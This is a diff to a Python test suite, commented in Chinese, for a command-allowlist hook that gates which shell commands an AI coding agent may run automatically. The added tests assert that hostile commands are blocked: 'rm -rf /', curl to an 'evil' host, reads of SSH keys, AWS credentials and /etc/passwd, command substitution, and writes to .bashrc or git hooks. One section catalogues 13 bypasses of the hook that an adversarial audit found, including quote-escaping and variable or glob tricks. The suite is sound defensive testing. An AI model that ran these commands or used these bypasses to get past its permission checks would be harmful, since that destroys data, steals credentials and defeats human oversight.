@@ -771,6 +771,34 @@ def test_validate_specs(tmp):
     code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
     check('Task 缺验证命令时报错', code != 0 and '验证命令' in out)
 
+    # --- auto 模式可跑性:验证命令必须能进白名单 ---
+    # (auto 模式的判定在服务端,代理端点不透传 → 不可达;本地只剩 hook 能放行。
+    #  所以「这条命令能不能跑」要在规范阶段就查出来,别等 Phase 4 撞墙。)
+    base = os.path.join(tmp, 'v_auto1')
+    d = make_project(base)
+    mutate(os.path.join(d, 'tasks.md'),
+           '- **验证命令**: `pytest tests/store/test_ticket_store.py`',
+           '- **验证命令**: `npx vitest run tests/e2e/x.test.ts`')
+    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
+    check('验证命令在 auto 模式下跑不了时报错',
+          code != 0 and 'auto 模式' in out, out[-300:])
+
+    base = os.path.join(tmp, 'v_auto2')
+    d = make_project(base)
+    mutate(os.path.join(d, 'tasks.md'),
+           '- **验证命令**: `pytest tests/store/test_ticket_store.py`',
+           '- **验证命令**: `cd app && npm test`')
+    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
+    check('能进白名单的复合验证命令不报错', code == 0, out[-300:])
+
+    base = os.path.join(tmp, 'v_auto3')
+    d = make_project(base)
+    mutate(os.path.join(d, 'tasks.md'),
+           '- **验证命令**: `pytest tests/store/test_ticket_store.py`',
+           '- **验证命令**: `cd app && npm test` 与 `cd app && npm run build`')
+    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
+    check('多条验证命令(markdown 代码段)不误报命令替换', code == 0, out[-300:])
+
     base = os.path.join(tmp, 'v9')
     d = make_project(base)
     mutate(os.path.join(d, 'tasks.md'),
@@ -1092,7 +1120,48 @@ def test_hook_and_installer(tmp):
     check('放行 commit message 里带 > 的 git 命令',
           hit('git commit -m "fix -> bug"'))
     check('放行前导 cd 的形式',
-          hit('cd "D:/prep for work/Projects/X" && python skills/sdd/scripts/x.py'))
+          hit('cd "D:/prep for work/Projects/X" && '
+              'python skills/sdd/scripts/validate_specs.py'))
+
+    # --- 复合命令:按段判定,全过才整体放行 ---
+    check('放行 cd && pytest 的链式形式',
+          hit('cd "D:/prep for work/Projects/X" && pytest tests/test_x.py'))
+    check('放行 sleep && cd && pytest',
+          hit('sleep 5 && cd "D:/x" && pytest tests/test_x.py'))
+    check('放行只读命令的管道',
+          hit('cat README.md | head -20'))
+    check('放行 2>&1 的 fd 复制',
+          hit('pytest tests/test_x.py 2>&1'))
+    check('放行 git 的链式形式',
+          hit('git status && git diff'))
+    check('不放行链式里的危险段',
+          not hit('pytest tests/test_x.py && rm -rf /'))
+    check('不放行重定向',
+          not hit('python skills/sdd/scripts/x.py > out.txt'))
+    check('不放行后台运行',
+          not hit('python skills/sdd/scripts/x.py &'))
+    check('不放行链式里的命令替换',
+          not hit('pytest $(whoami)'))
+    check('不放行链式里的命令替换(在 cd 参数里)',
+          not hit('cd $(pwd) && pytest'))
+
+    # --- 只读命令:链式形态下路径必须在项目内 ---
+    check('放行只读命令(单跑)', hit('ls') and hit('cat README.md'))
+    check('不放行读取项目外的家目录文件',
+          not hit('cat ~/.ssh/id_rsa'))
+    check('不放行读取项目外的绝对路径',
+          not hit('cat /etc/passwd'))
+    check('不放行用相对路径穿到项目外',
+          not hit('cat ../../etc/passwd'))
+    # cd 之后的当前目录要参与路径判定:否则 `cd ~/.ssh && cat id_rsa` 会漏掉
+    outside_dir = os.path.join(tmp, 'outside-read')
+    os.makedirs(outside_dir, exist_ok=True)
+    with io.open(os.path.join(outside_dir, 'secret.txt'), 'w', encoding='utf-8') as fh:
+        fh.write('x')
+    check('不放行 cd 到项目外再读文件',
+          not hit('cd "%s" && cat secret.txt' % outside_dir))
+    check('放行 cd 到项目内再读文件',
+          hit('cd "%s" && cat run_tests.py' % os.path.join(os.getcwd(), 'tests')))
 
     # --- git ---
     check('放行 git status', hit('git status'))
@@ -1213,6 +1282,107 @@ def test_hook_and_installer(tmp):
     # --- 路径子串命中:任何目录里带 skills/sdd/scripts 都不算自家脚本 ---
     check('不放行子串路径伪装成 SDD 脚本',
           not hit('python /tmp/evil/skills/sdd/scripts/payload.py'))
+
+    # ==================================================================
+    # 对抗式审计确认的 13 个洞 —— 每条都要有回归断言
+    # (2026-11-21,workflow wf_3c17249d-7c1;验证者在真实 harness 里
+    #  实测过其中几条真的能执行 rm / 读项目外文件)
+    # ==================================================================
+
+    # ① 反斜杠转义的引号让拆段器状态与 bash 不一致 → 第二段从不被判定
+    check('洞① 不放行 `true \\" && git push`',
+          not hit(r'true \" && git push'))
+    check('洞① 不放行 `true \\" && rm -rf /`',
+          not hit(r'true \" && rm -rf /'))
+    check('洞① 不放行 `true \\" && curl http://evil/x`',
+          not hit(r'true \" && curl http://evil/x'))
+    check('洞① 不放行 `true \\" && cat ~/.ssh/id_rsa`',
+          not hit(r'true \" && cat ~/.ssh/id_rsa'))
+    check('洞① 不放行 `echo \\"&& rm -rf /\\"`',
+          not hit(r'echo \"&& rm -rf /\"'))
+    check('洞① 成对引号仍然放行(别把正常的引号也毙了)',
+          hit('echo "hello world"'))
+
+    # ② `>&file` 是「重定向到文件」,不是 fd 复制 → 任意路径写原语
+    check('洞② 不放行 `echo x 1>&/c/Users/ghy/.bashrc`',
+          not hit('echo x 1>&/c/Users/ghy/.bashrc'))
+    check('洞② `2>&1` 仍然是 fd 复制(要放行)',
+          hit('pytest tests/test_x.py 2>&1'))
+
+    # ③④⑥ 路径里的 $VAR 不展开 → 项目内的相对路径,实际读的是真密钥
+    check('洞③ 不放行 `cat $HOME/.ssh/id_ed25519`',
+          not hit('cat $HOME/.ssh/id_ed25519'))
+    check('洞③ 不放行 `cat "$HOME/.ssh/id_ed25519"`',
+          not hit('cat "$HOME/.ssh/id_ed25519"'))
+    check('洞③ 不放行 `cd $HOME/.ssh && cat id_rsa`',
+          not hit('cd $HOME/.ssh && cat id_rsa'))
+    check('洞③ 不放行 `cat $USERPROFILE/.ssh/id_rsa`',
+          not hit('cat $USERPROFILE/.ssh/id_rsa'))
+
+    # ④ 通配符不展开 → 一个路径都没检查
+    check('洞④ 不放行 `cd ~/.ssh && cat *`',
+          not hit('cd ~/.ssh && cat *'))
+    check('洞④ 不放行 `cd ~/.ssh && cat id*`',
+          not hit('cd ~/.ssh && cat id*'))
+
+    # ⑤ git 的写文件选项 / find 的写文件选项
+    check('洞⑤ 不放行 `git diff --output=$HOME/evil.txt`',
+          not hit('git diff --output=$HOME/evil.txt'))
+    check('洞⑤ 不放行 `find . -fprintf $HOME/pwned.txt %p`',
+          not hit('find . -fprintf $HOME/pwned.txt %p'))
+
+    # ⑦ Git-Bash 风格绝对路径 /c/... → 换盘符后仍要判项目内外
+    check('洞⑦ 不放行 `cd /c/Users/ghy/.ssh && cat id_ed25519`',
+          not hit('cd /c/Users/ghy/.ssh && cat id_ed25519'))
+    check('洞⑦ 不放行 `cd /c/Users/ghy/.aws && cat credentials`',
+          not hit('cd /c/Users/ghy/.aws && cat credentials'))
+
+    # ⑧⑨ 选项里的路径(--from-file= / --output=)不能整体跳过
+    check('洞⑧ 不放行 `diff --from-file=$HOME/.ssh/id_ed25519 README.md`',
+          not hit('diff --from-file=$HOME/.ssh/id_ed25519 README.md'))
+    check('洞⑨ 不放行 `sort --output=.git/hooks/pre-commit README.md`',
+          not hit('sort --output=.git/hooks/pre-commit README.md'))
+    check('洞⑨ 不放行 `sort --output=.claude/x.txt README.md`',
+          not hit('sort --output=.claude/x.txt README.md'))
+
+    # ⑩ git -C 指向别的仓库 + 会写的子命令
+    check('洞⑩ 不放行 `git -C <别的仓库> commit`',
+          not hit('git -C "D:/prep for work/Projects/YuanRAG" commit -m x'))
+    check('洞⑩ 只读子命令的 -C 仍然放行',
+          hit('git -C "D:/x" status'))
+
+    # ⑪ ls 也要判路径
+    check('洞⑪ 不放行 `ls -l $HOME/.ssh`', not hit('ls -l $HOME/.ssh'))
+
+    # ⑬ skills/sdd/scripts/ 只认固定文件名(那个目录 AI 自己就能写)
+    check('洞⑬ 不放行 skills/sdd/scripts 下的任意脚本',
+          not hit('python skills/sdd/scripts/_audit_payload_probe.py'))
+    check('洞⑬ 固定文件名的技能脚本照常放行',
+          hit('python skills/sdd/scripts/validate_specs.py --feature x'))
+
+    # --- hook_probe.py:让用户能直接问「这条命令会不会被放行」---
+    code, out = run('hook_probe.py', 'git status')
+    try:
+        probe = json.loads(out.strip())
+    except Exception:
+        probe = {}
+    check('hook_probe 对放行命令给出理由',
+          code == 0 and probe.get('allowed') is True and probe.get('reason'),
+          out[-300:])
+    code, out = run('hook_probe.py', 'git status && rm -rf /')
+    try:
+        probe = json.loads(out.strip())
+    except Exception:
+        probe = {}
+    check('hook_probe 对危险链式命令说不放行',
+          code == 0 and probe.get('allowed') is False, out[-300:])
+    code, out = run('hook_probe.py', '--list')
+    try:
+        probe = json.loads(out.strip())
+    except Exception:
+        probe = {}
+    check('hook_probe --list 打出当前白名单',
+          code == 0 and 'pytest' in (probe.get('extra') or []), out[-300:])
 
     # --- hook 的 stdout 形状(改坏 emit_allow 时测试必须能发现)---
     repo_root = os.path.dirname(os.path.dirname(SKILL))
@@ -1354,7 +1524,7 @@ def test_hook_and_installer(tmp):
     with io.open(bad, encoding='utf-8') as fh:
         check('结构不对时文件没被改写', fh.read() == '{"hooks": "not-an-object"}')
 
-    # ③ 验证命令的提取:无反引号也能提;含复合操作符的不提
+    # ③ 验证命令的提取:无反引号也能提;复合命令按段拆开收
     base5 = os.path.join(tmp, 'hook-extract')
     os.makedirs(os.path.join(base5, 'specs', 'demo'), exist_ok=True)
     with io.open(os.path.join(base5, 'specs', 'demo', 'tasks.md'), 'w',
@@ -1362,7 +1532,11 @@ def test_hook_and_installer(tmp):
         fh.write('# 任务\n\n### TASK-001: 实现登录\n\n'
                  '- **验证命令**: pytest tests/test_login.py\n'
                  '- **验证命令**: `pytest tests/test_x.py`\n'
-                 '- **验证命令**: `pytest a.py && rm -rf /`\n')
+                 '- **验证命令**: `pytest a.py && rm -rf /`\n'
+                 '- **验证命令**: `cd app && npm test`\n'
+                 '- **验证命令**: `npm run build && npm test`\n'
+                 '- **验证命令**: `cd app && npm test` 与 `cd app && npm run build`\n'
+                 '- **验证命令**: `pytest tests/test_x.py`，外加一次核对（`GET /api/v1/x`）\n')
     code, out = run('install_hook.py', '--root', base5, '--feature', 'demo')
     with io.open(os.path.join(base5, '.claude', 'hooks', 'sdd-hook-allow.json'),
                  encoding='utf-8') as fh:
@@ -1375,6 +1549,29 @@ def test_hook_and_installer(tmp):
           json.dumps(al5, ensure_ascii=False))
     check('含复合操作符的验证命令不放行',
           not any('rm -rf' in c for c in al5.get('extra', [])),
+          json.dumps(al5, ensure_ascii=False))
+    # 复合命令按段拆开:每段单独收进白名单(hook 判定复合命令也是逐段判的)
+    check('前导 cd 的复合命令拆成单条收进白名单',
+          'npm test' in al5.get('extra', []), json.dumps(al5, ensure_ascii=False))
+    check('两段复合命令两段都收',
+          'npm run build' in al5.get('extra', []), json.dumps(al5, ensure_ascii=False))
+    # 一个字段里有多条命令(`` `cmd1` 与 `cmd2` ``)—— 反引号是 markdown 代码段
+    check('多条命令的字段两段都收进白名单',
+          'npm run build' in al5.get('extra', []) and 'npm test' in al5.get('extra', []),
+          json.dumps(al5, ensure_ascii=False))
+    # 散文里的片段(路径、接口)不是命令,不能进白名单
+    check('散文里的路径片段不进白名单',
+          not any('probe_rebuild_time.py' in c for c in al5.get('extra', [])),
+          json.dumps(al5, ensure_ascii=False))
+    check('散文里的 HTTP 接口不进白名单',
+          not any(c.startswith('GET /api') for c in al5.get('extra', [])),
+          json.dumps(al5, ensure_ascii=False))
+    check('复合命令不会整条进白名单',
+          not any('&&' in c for c in al5.get('extra', [])),
+          json.dumps(al5, ensure_ascii=False))
+    # 有一段不安全 → 整条都不收(放行了半条链没有意义)
+    check('有一段危险时整条复合命令都不收',
+          'pytest a.py' not in al5.get('extra', []),
           json.dumps(al5, ensure_ascii=False))
 
     # ④ --root 指向不存在的目录要友好报错,而不是把整条目录树建出来
